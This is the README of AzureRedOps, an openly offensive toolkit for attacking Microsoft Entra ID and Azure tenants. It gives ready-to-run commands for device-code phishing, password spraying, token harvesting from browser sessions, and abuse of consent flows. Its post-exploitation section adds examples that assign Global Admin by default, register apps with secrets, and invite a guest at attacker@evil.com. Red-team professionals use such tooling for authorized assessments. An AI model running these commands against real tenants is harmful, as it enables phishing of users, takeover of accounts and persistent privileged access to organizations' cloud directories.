# AzureRedOps

> A Swiss Army tool for Azure / Entra ID red teaming.

**Author:** Mr.Un1k0d3r ([TrueCyber Inc](https://truecyber.world))
**Version:** 0.1
**Language:** Python 3.12+

---

## Overview

AzureRedOps is a offensive security toolkit for assessing the security
posture of **Microsoft Entra ID and Azure** tenants. It wraps the most common
red-team workflows — authentication, token management, directory enumeration,
privilege checking, password spraying, and post-exploitation actions against
**Microsoft Graph** — behind one consistent `--activity` driven CLI.

Every operation is selected with `-a/--activity`. Tokens obtained during
authentication can be cached locally (`.azure_creds`) and reused by name with
`-l/--load-access-token`, so you rarely have to paste raw JWTs.

Learn more about the tool [on CYPFER blog](https://offsec.cypfer.com/blog/AzureRedOps-Azure-red-team)

### Features

- **Token management** — save, list, decode/view, and delete access/refresh tokens in a local credential store (`.azure_creds`). Any flow can persist its tokens automatically with `-s/--save` + `-n/--name`.
- **Multiple authentication flows:**
  - **ROPC** (`auth`) — direct username/password authentication.
  - **Device-code phishing** (`phish-start` / `phish-capture`) — abuse the OAuth device authorization grant to capture tokens issued when a target enters your user code at `microsoft.com/devicelogin`. Auto-captures by default.
  - **Third-party app consent** (`auth-app`) — full Authorization Code + PKCE flow against a custom application registration, served by a built-in local HTTPS listener that receives the redirect.
  - **Interactive browser capture** (`auth-interactive`) — drive a real Chromium browser with Playwright (handles MFA / Conditional Access / SSO), then harvest every token from the recorded session HAR.
  - **Refresh-token exchange** (`refresh`) — trade a refresh token for fresh access tokens.
- **Directory enumeration** via Microsoft Graph — users, applications, service principals, authorization policies, and a bulk `gather-all` collector.
- **Password spraying** against known Microsoft first-party app IDs (`spray`) and cross-app refresh-token spraying (`spray-refresh`).
- **Post-exploitation** — register applications, create groups, assign directory roles, invite external (guest) users, and upload files to OneDrive.
- **Recon helpers** — `magic-app` finds publicly-redirectable apps with `AllPrincipals` consent; built-in lists of known/interesting Microsoft app IDs.
- **Quality-of-life** — beta-endpoint switch, custom headers, custom user-agent/scope/audience, attribute filtering, expanded output, debug/verbose-HTTP logging, and output redirection to a file.

---

## Requirements

- Python **3.12 or newer** (the code relies on PEP 701 f-string syntax).
- Python packages (see `requirements.txt`):
  - `PyJWT`
  - `requests`
  - `playwright`
- A browser runtime for Playwright (only needed for the `auth-interactive` activity).
- TLS certificate + key at `includes/web/cert.pem` and `includes/web/key.pem`
  (only needed for the `auth-app` PKCE flow — see [Notes](#notes--tips)).

---

## Installation

```bash
# Clone the repository
git clone <your-fork-url> AzureRedOps
cd AzureRedOps

# Create and activate a virtual environment
python3 -m venv AzureRedOps
source AzureRedOps/bin/activate          # Linux / macOS
# .\AzureRedOps\Scripts\Activate.ps1     # Windows PowerShell

# Install dependencies
pip install -r requirements.txt

# Install the browser used by auth-interactive (one-time)
python -m playwright install chromium
```

Run the tool:

```bash
python3 AzureRedOps.py -a <activity> [options]
```

---

## Usage

The general invocation pattern is:

```bash
python3 AzureRedOps.py -a <activity> [authentication] [activity options] [global options]
```

### Providing a token

Activities that call Microsoft Graph need an access token. You can supply it two ways:

| Method | Flag | Example |
|--------|------|---------|
| Pass a raw token | `-ac, --access-token` | `-ac eyJ0eXAi...` |
| Load a cached token by name | `-l, --load-access-token` | `-l mytoken` |

When `-l` is used, the matching `access_token` (and, where relevant, `refresh_token`
and `tenant`) is read from the `.azure_creds` store.

### Saving tokens to a file (`-s` / `-n`)

Any activity that obtains tokens (`auth`, `auth-app`, `auth-interactive`,
`phish-start`/`phish-capture`, `refresh`) can **automatically persist them** to the
local credential store (`.azure_creds`) by adding `-s/--save` together with
`-n/--name`:

```bash
# Authenticate and save the resulting tokens under the name "victim1"
python3 AzureRedOps.py -a auth -u user@contoso.com -p 'P@ssw0rd!' -tid <tenant-guid> -s -n victim1
```

- `-s/--save` turns on auto-save; **it requires `-n/--name`** — the tool exits with an
  error if `-n` is missing.
- `-n/--name` is the key the token is stored under. You can later reuse it with
  `-l victim1` instead of pasting the raw JWT, view it with `-a view -n victim1`, or
  delete it with `-a delete -n victim1`.
- The `auth-interactive` activity always auto-saves and will prompt you for a name
  interactively if `-n` is not supplied.

### Saving activity output to a file (`-j`)

Most enumeration activities (`list-users`, `list-applications`, `list-principals`,
`gather-all`, `raw-url`) accept `-j/--json <filename>` to write the raw API response
to a JSON file instead of (or in addition to) printing it:

```bash
# Dump every user to users.json
python3 AzureRedOps.py -a list-users -l victim1 -j users.json
```

For `gather-all`, the supplied filename is used as a suffix and one file is written
per Graph endpoint (e.g. `users-<name>`, `groups-<name>`, ...).

> Tip: `-j` controls structured JSON export, while `-re/--redirect-to-file` mirrors
> the formatted console output to `output.txt`. The two are independent.

### Tenant identifiers

- `-t, --tenant` expects a **domain name** (e.g. `contoso.com`) and is used by the `id` activity.
- `-tid, --tenant-id` expects a **tenant GUID** or `common`, used by the authentication activities.

---

## Command-Line Options

| Short | Long | Default | Description |
|-------|------|---------|-------------|
| `-a` | `--activity` | `id` | **(required)** Activity to perform (see [Activities](#activities)). |
| `-ac` | `--access-token` | | Azure access token. |
| `-n` | `--name` | | Name used to save/load a token, or display name for `register-app`/`new-group`/`invite`. |
| `-t` | `--tenant` | | Azure tenant **domain** name (used by `id`). |
| `-c` | `--devicecode` | | Device code (used by `phish-capture`). |
| `-tid` | `--tenant-id` | | Azure tenant **ID** (GUID) or `common`. |
| `-app` | `--appid` | `d3590ed6-52b3-4102-aeff-aad2292ab01c` | Application (client) ID. |
| `-e` | `--endpoint` | `microsoftonline.com` | Login endpoint domain to target. |
| `-r` | `--refresh-token` | | Authentication refresh token. |
| `-as` | `--auto-start` | `True` | Automatically start device-code capture after `phish-start`. |
| `-l` | `--load-access-token` | | Load a cached token by name from `.azure_creds`. |
| `-j` | `--json` | | Save activity output to the given JSON file. |
| `-fl` | `--filter` | | Only print attributes whose key matches one of these (comma-separated). |
| `-u` | `--username` | | User principal name (email). |
| `-p` | `--password` | | User password. |
| `-s` | `--save` | `False` | Auto-save obtained tokens to `.azure_creds` (**requires `-n`**). |
| `-cp` | `--check-privileges` | `False` | After a successful spray login, probe whether users/apps can be enumerated. |
| `-uid` | `--uid` | | Azure user object ID (used by `add-group`). |
| `-headers` | `--headers` | | Extra HTTP headers as JSON, e.g. `{"X-Foo": "bar"}`. |
| `-gid` | `--gid` | `62e90394-69f5-4237-91f9-056ad24d70a7` | Directory role / group ID (default = **Global Administrator**). |
| `-i` | `--id` | `False` | For `interest`: print only the application IDs. |
| `-ty` | `--type` | | For `interest`: filter to a specific category. |
| `-fp` | `--filepath` | | File to upload (`push-file`) or custom app list for spraying. |
| `-v` | `--version` | `v2.0` | Authentication API version: `v0` or `v2.0`. |
| `-ua` | `--user-agent` | *(Chrome UA string)* | Override the HTTP `User-Agent`. |
| `-au` | `--audience` | `https://graph.microsoft.com` | Token audience/resource. |
| `-sc` | `--scope` | `openid offline_access` | OAuth2 scope. Use `https://graph.microsoft.com/.default` for Graph, `openid` for spraying. |
| `-url` | `--url` | | Target URL for `raw-url`/`invite`; comma-separated list of URLs for `auth-interactive`. |
| `-beta` | `--beta` | `False` | Use the Microsoft Graph **beta** endpoint for `list-users`/`list-applications`. |
| `-exp` | `--expand` | `False` | Expand nested lists/dicts in output to a human-readable format. |
| `-k` | `--keep` | `False` | Keep the `session.har` file after `auth-interactive`. |
| `-d` | `--debug` | `False` | Enable debug logging. |
| `-dd` | `--verbose-debug` | `False` | Enable verbose HTTP request/response logging. |
| `-re` | `--redirect-to-file` | `False` | Mirror all console output to `output.txt`. |

---

## Activities

Below, each activity lists its **required** and *optional* arguments.
"Token" means either `-ac` or `-l` is required.

### Token Management

| Activity | Required | Optional | Description |
|----------|----------|----------|-------------|
| `save` | `-ac`, `-n` | `-tid`, `-r` | Save an access (and optional refresh) token to `.azure_creds`. |
| `list-token` | — | — | List the names of all saved tokens. |
| `view` | `-n` | — | Decode and display the JWT claims of a saved token. |
| `delete` | `-n` | — | Remove a saved token from the store. |

```bash
# Save a token under the name "mytoken"
python3 AzureRedOps.py -a save -n mytoken -ac eyJ0eXAi... -r 0.AReAB... -tid <tenant-guid>

# List, view, delete
python3 AzureRedOps.py -a list-token
python3 AzureRedOps.py -a view -n mytoken
python3 AzureRedOps.py -a delete -n mytoken
```

### Tenant Discovery & Authentication

| Activity | Required | Optional | Description |
|----------|----------|----------|-------------|
| `id` | `-t` | — | Resolve the tenant ID for a given email domain. |
| `phish-start` | — | `-app`, `-tid`, `-as`, `-s`, `-n` | Begin a device-code flow; prints the user code and (by default) auto-captures. |
| `phish-capture` | `-c` | `-app`, `-tid`, `-s`, `-n` | Poll for tokens using a previously issued device code. |
| `auth` | `-u`, `-p`, `-tid`, `-app`, `-v` | `-s`, `-n` | Authenticate with username/password (ROPC). |
| `auth-app` | `-tid` | `-s`, `-n` | Authorization-Code + PKCE flow via a local HTTPS listener. |
| `auth-interactive` | — | `-url`, `-k`, `-n` | Spawn a browser (Playwright), let the user log in, and harvest tokens from the session HAR. Always auto-saves. |
| `refresh` | `-v`, `-app`, and (`-l`) **or** (`-r` + `-tid`) | `-s`, `-n` | Exchange a refresh token for a fresh access token. |

```bash
# Resolve a tenant ID from a domain
python3 AzureRedOps.py -a id -t contoso.com

# Device-code phishing (auto-capture is on by default)
python3 AzureRedOps.py -a phish-start -tid common -app d3590ed6-52b3-4102-aeff-aad2292ab01c

# Capture later with a previously issued device code
python3 AzureRedOps.py -a phish-capture -c <device-code> -tid common

# Username / password (ROPC)
python3 AzureRedOps.py -a auth -u user@contoso.com -p 'P@ssw0rd!' -tid <tenant-guid>

# Interactive browser capture, saving tokens automatically
python3 AzureRedOps.py -a auth-interactive -url https://portal.azure.com -s -n harvested

# Refresh a saved token
python3 AzureRedOps.py -a refresh -l mytoken -app d3590ed6-52b3-4102-aeff-aad2292ab01c
```

#### How the authentication flows work

AzureRedOps implements several distinct ways of obtaining tokens. Pick the one that
matches your engagement; all of them honour `-s/-n` for auto-saving the result.

##### Device-code phishing (`phish-start` / `phish-capture`)

The OAuth 2.0 **device authorization grant** is designed for input-constrained
devices, which makes it a powerful phishing primitive: you request a code on behalf of
a first-party Microsoft application, then socially-engineer a target into entering that
code at `https://microsoft.com/devicelogin` while signed into their account. Once they
do, the tokens are issued **to you**.

- `phish-start` requests a device code and prints the **user code**, the login URL,
  and the raw **device code**. Because `-as/--auto-start` defaults to `True`, it then
  immediately begins polling for the token — so simply running `phish-start` and
  handing the user code to the target is usually all you need.
- `phish-capture` is the manual counterpart: feed it a device code you obtained earlier
  with `-c/--devicecode` and it polls the token endpoint until the victim completes the
  login (the tool silently retries while authorization is pending).
- Use `-app/--appid` to impersonate a specific first-party client and `-tid/--tenant-id`
  to scope to a tenant (`common` by default). Tip: set the scope to
  `'https://graph.microsoft.com/.default offline_access openid'` to get a Graph-ready
  token with a refresh token.

```bash
# Start a device-code session (auto-captures the token once the victim logs in)
python3 AzureRedOps.py -a phish-start -tid common -s -n phished

# Or capture against a code you generated separately
python3 AzureRedOps.py -a phish-capture -c <device-code> -tid common -s -n phished
```

##### Third-party application consent (`auth-app`)

`auth-app` performs a full **Authorization Code flow with PKCE** against a third-party
(non-default) application registration. The tool spins up a local **HTTPS listener**
(`includes/Webserver.py`, on `https://localhost:2342`) that acts as the OAuth redirect
URI, generates the PKCE `code_verifier`/`code_challenge` pair, and prints an
authorization URL for you to open in a browser. After you consent, Azure redirects the
authorization code back to the local listener, which the tool then exchanges for tokens.

This is the flow to use when you control (or have registered) an application and want to
drive consent through a real browser session — useful for illicit-consent style
scenarios or when ROPC is blocked.

- Requires a TLS certificate/key pair at `includes/web/cert.pem` and
  `includes/web/key.pem` (see [Notes](#notes--tips) for how to generate them).
- The default client ID for this flow is `8545b2fc-a69c-4851-9206-0f74a519fe5f`.

```bash
python3 AzureRedOps.py -a auth-app -tid <tenant-guid> -s -n consented
```

##### Interactive browser authentication (`auth-interactive`)

`auth-interactive` launches a **real Chromium browser via Playwright** and lets the
operator (or a target on a shared session) complete an interactive login — including
MFA, Conditional Access, and federated/SSO redirects that scripted flows cannot
satisfy. The entire browser session is recorded to a HAR file (`session.har`); the tool
then parses that capture, extracts **every** access/refresh token pair seen on the
`/oauth2/v2.0/token` endpoint, decodes each JWT, and lets you choose which one(s) to
save.

- `-url/--url` sets the page(s) to navigate to after the login page loads. It accepts a
  **comma-separated list** of URLs (e.g. `https://portal.azure.com,https://outlook.office.com`)
  so you can collect tokens for multiple resources in one session. Defaults to
  `https://portal.azure.com`.
- This activity **always auto-saves**: after harvesting, it prompts for which token
  index(es) to keep and a name to store them under.
- Add `-k/--keep` to preserve `session.har` for offline analysis (it is deleted by
  default).

```bash
# Log in interactively and harvest tokens for two resources
python3 AzureRedOps.py -a auth-interactive -url https://portal.azure.com,https://outlook.office.com -k
```

### Microsoft Graph Operations

| Activity | Required | Optional | Description |
|----------|----------|----------|-------------|
| `self` | Token | — | Display the current user's profile (`/me`). |
| `email` | Token, `-fl` | — | Search the signed-in user's mailbox for a keyword. |
| `permission` | Token | — | Show the tenant authorization policy (beta). |
| `list-users` | Token | `-j`, `-beta`, `-fl`, `-exp` | Enumerate all users. |
| `list-applications` | Token | `-j`, `-beta`, `-fl`, `-exp` | Enumerate all applications. |
| `list-principals` | Token | `-j`, `-fl`, `-exp` | Enumerate all service principals. |
| `register-app` | Token, `-n` | — | Register a new application (with a 1-year client secret). |
| `new-group` | Token, `-n` | — | Create a new security group. |
| `add-group` | Token, `-uid` | `-gid` | Assign a directory role to a principal (default role = Global Admin). |
| `push-file` | Token, `-fp`, `-n` | — | Upload a local file to the user's OneDrive. |
| `gather-all` | Token | `-j` | Bulk-collect users, groups, apps, SPs, roles, policies, and grants. |
| `raw-url` | Token, `-url` | `-j`, `-fl`, `-exp` | Issue a raw GET to any Graph/REST URL (handles `@odata.nextLink` paging). |
| `invite` | Token, `-n` | `-url` | Invite an external (guest) user. `-n` is the invitee's email. |
| `magic-app` | Token | — | Find apps with `AllPrincipals` consent, `appRoleAssignmentRequired=false`, and public redirect URIs. |

```bash
# Who am I?
python3 AzureRedOps.py -a self -l mytoken

# Enumerate users (beta endpoint, save to JSON, only show some fields)
python3 AzureRedOps.py -a list-users -l mytoken -beta -j users.json -fl displayName,userPrincipalName

# Register an application
python3 AzureRedOps.py -a register-app -n EvilApp -l mytoken

# Assign Global Admin to a user
python3 AzureRedOps.py -a add-group -uid <user-object-id> -l mytoken

# Upload a file to OneDrive
python3 AzureRedOps.py -a push-file -fp ./payload.docx -n payload.docx -l mytoken

# Query an arbitrary Graph URL
python3 AzureRedOps.py -a raw-url -url "https://graph.microsoft.com/beta/users" -l mytoken

# Invite an external user
python3 AzureRedOps.py -a invite -n attacker@evil.com -url https://example.com/invite -l mytoken

# Hunt for exploitable public apps
python3 AzureRedOps.py -a magic-app -l mytoken
```

### Password Spraying

| Activity | Required | Optional | Description |
|----------|----------|----------|-------------|
| `spray` | `-u`, `-p`, `-tid` | `-fp`, `-cp` | Spray credentials against known first-party app IDs (v0 + v2.0 APIs). |
| `spray-refresh` | `-v`, and (`-l`) **or** (`-r` + `-tid`) | `-fp`, `-cp` | Replay a refresh token across many app IDs. |

By default both activities use `includes/auth_apps.json` as the app source; override
with `-fp`. Add `-cp` to test whether each successful login can enumerate users/apps.

```bash
# Spray a single credential across first-party apps
python3 AzureRedOps.py -a spray -u user@contoso.com -p 'P@ssw0rd!' -tid <tenant-guid> -cp

# Cross-app refresh spraying from a saved token
python3 AzureRedOps.py -a spray-refresh -l mytoken -v v2.0
```

### Intelligence & Discovery

| Activity | Required | Optional | Description |
|----------|----------|----------|-------------|
| `knownids` | — | `-fl`, `-exp` | List known Microsoft application IDs (`includes/apps.json`). |
| `list-interest` | — | — | List the app categories defined in `includes/auth_apps.json`. |
| `interest` | — | `-i`, `-ty` | List interesting app IDs; `-i` prints IDs only, `-ty` filters by category. |

```bash
python3 AzureRedOps.py -a knownids
python3 AzureRedOps.py -a list-interest
python3 AzureRedOps.py -a interest -ty all_users
python3 AzureRedOps.py -a interest -i          # IDs only
```

---

## Output & Generated Files

| File | Created by | Description |
|------|-----------|-------------|
| `.azure_creds` | Token-saving activities | Local JSON cache of access/refresh tokens, keyed by name. |
| `output.txt` | `-re` flag | Timestamped mirror of all console output. |
| `session.har` | `auth-interactive` | Browser session recording (deleted unless `-k` is set). |
| `<name>.json` | `-j` flag / `gather-all` | Saved API responses. |

### Bundled data files

| File | Description |
|------|-------------|
| `includes/auth_apps.json` | Target application IDs used for spraying and the `interest` lists. |
| `includes/apps.json` | Known Microsoft app IDs and metadata for `knownids`. |
| `includes/Webserver.py` | Local HTTPS listener implementing the PKCE redirect for `auth-app`. |
| `includes/web/cert.pem`, `includes/web/key.pem` | TLS material for the local listener. |

---

## Notes & Tips

- **Default app ID** (`d3590ed6-52b3-4102-aeff-aad2292ab01c`) is the Microsoft Office
  first-party client, which works for most flows. The hints printed by some activities
  suggest extending tokens to the **Microsoft Azure CLI** app (`04b07795-8ddb-461a-bbee-02f9e1bf7b46`)
  for broader access.
- **Scope guidance:** use `-sc openid` for password spraying and
  `-sc 'https://graph.microsoft.com/.default'` for Graph operations.
- **`--beta`** switches `list-users` / `list-applications` to the Graph beta endpoint,
  which can surface extra information (e.g. on-prem sync attributes).
- **`auth-app` TLS:** the local PKCE listener requires a certificate/key pair at
  `includes/web/cert.pem` and `includes/web/key.pem`. Generate a self-signed pair if
  they are missing, e.g.:
  ```bash
  openssl req -x509 -newkey rsa:2048 -nodes \
    -keyout includes/web/key.pem -out includes/web/cert.pem -days 365 -subj "/CN=localhost"
  ```
- **Debugging:** `-d` prints high-level debug info; `-dd` dumps full HTTP requests and
  responses (headers + bodies) — useful when diagnosing failed token exchanges.

---

## Credits

Created by **Mr.Un1k0d3r** — TrueCyber Inc.
